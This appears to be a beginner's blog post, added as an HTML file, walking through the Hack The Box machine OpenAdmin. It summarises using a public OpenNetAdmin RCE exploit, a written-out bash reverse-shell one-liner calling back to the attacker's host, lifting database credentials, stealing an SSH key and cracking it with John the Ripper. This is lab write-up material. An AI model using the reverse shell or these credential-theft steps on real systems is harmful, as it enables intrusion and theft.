@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title> OpenAdmin WriteUp &middot; Vdgonc - The noob blog about hacking. </title>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.79.0" />
+
+
+
+
+<script src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="http://vdgonc.github.io/css/nix.css">
+
+
+
+
+
+<link href="https://fonts.googleapis.com/css?family=Inconsolata%7COpen+Sans%7CConcert+One" rel="stylesheet">
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+				  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', '21590272', 'auto');
+	  ga('send', 'pageview');
+
+</script>
+
+
+
+
+    </head>
+
+    <body>
+        <header>
+<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+      <a class="navbar-brand" id="green-terminal" href='http://vdgonc.github.io/'>
+        vdgonc@0x0eax ~ $
+      </a>
+		</div>
+
+		
+		<div class="collapse navbar-collapse" id="navbar-collapse-1">
+			<ul class="nav navbar-nav navbar-right">
+				<li>
+					<a href='http://vdgonc.github.io/'>/home/vdgonc</a>
+        </li>
+        
+				
+				
+				<li class="dropdown">
+                    
+            		<a href="http://vdgonc.github.io/about">~/about</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a href="http://vdgonc.github.io/posts">~/posts</a>
+            		
+        		</li>
+        		
+
+			</ul>
+		</div>
+	</div>
+</nav>
+</header>
+
+        <div class="flex-wrapper">
+            <div class="container wrapper">
+                <h1><a href="http://vdgonc.github.io/posts/openadmin-writeup/">OpenAdmin WriteUp</a></h1>
+                <span class="post-date">2020-04-15 </span>
+                <div class="post-content">
+                    <p>Hey everyone, Vdgonc here.</p>
+<p> </p>
+<p>So this is my walkthrough of OpenAdmin on Hack The Box.</p>
+<hr>
+<p><strong>Disclaimer:</strong> <em>It’s my first public post in English, also my third post in all my life. Also, my idea is to show how I think when I&rsquo;m solving a challenge, so there will be no flag to show.</em></p>
+<hr>
+<p>With port scanning, I detect two open ports (22 and 80), the port 80 running Apache Server then using <a href="https://github.com/OJ/gobuster">Gobuster</a> to enumerate folder and files on the server I found the directory <code>/ona</code>.</p>
+<p>Okay, accessing de <code>/ona</code>.  The path is Open Net Admin panel running one vulnerable version.  I search for exploits and found, <a href="https://www.exploit-db.com/exploits/47691">OpenNetAdmin RCE</a>, the date of exploit 11/19/2019  it’s interesting.</p>
+<p>The exploit is a bash file publish for <strong>mattpascoe</strong> <em>(thank you)</em>, where this executes a request using curl with so many params and you can execute commands.</p>
+<p>At this point, you have thought it done.</p>
+<p>Nops, I open 9000 port on my laptop and execute the command <code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/9000 0&gt;&amp;1</code> to get a remote shell. After some time enumerating users, folders and file permissions, I get credentials from the database config file.</p>
+<p><strong>This is my tip:</strong> <em>if you found credentials test it with all users.</em></p>
+<p>With logged user, I begin enumeration process again, exists some files user own and one service listen on localhost. I used a curl trick and take an ssh key of other users.</p>
+<p>I tried to log in with this key, so I failed.  I need to use a password, but where is it the password. At this moment I think the same password for all users, fails again.</p>
+<p>I confess I tried more three times the same password, this is an idiot idea, but when the stated brute force on key using <a href="https://github.com/magnumripper/JohnTheRipper">John The Ripper</a> I get the password also I get the flag.</p>
+<p>The rest of the process is escalating privileges using a command to <code>read/write</code> on a specific file.</p>
+<p>So, thank you for reading this is a new experience for me writing on a new language. See you again.</p>
+
+                </div>
+                
+                <div class="post-comments">
+                    
+                </div>
+                
+            </div>
+            <footer class="footer text-center">
+<p>Copyright &copy; 2020 VdGonc -
+<span class="credit">
+	Powered by
+	<a target="_blank" href="https://gohugo.io">Hugo</a>
+	and
+	<a target="_blank" href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme.
+</span>
+</p>
+</footer>
+
+        </div>
+    </body>
